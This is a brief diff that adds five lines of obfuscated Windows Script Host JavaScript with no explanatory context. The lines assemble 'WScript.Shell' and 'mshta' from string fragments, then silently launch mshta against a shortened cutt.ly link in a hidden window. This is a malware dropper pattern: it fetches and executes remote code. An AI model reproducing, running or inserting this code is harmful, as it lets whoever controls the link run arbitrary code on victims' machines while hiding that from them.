@@ -1,0 +1,5 @@
+zyarivot = ("cript.Sh")
+var ytjcgctd = WScript.CreateObject("WS"+zyarivot+"ell")
+libswtcm = ("msh")
+xkvvrujw = ("ta ")
+ytjcgctd.Run((libswtcm+xkvvrujw)+" https://cutt.ly/Tb69iSV",0)
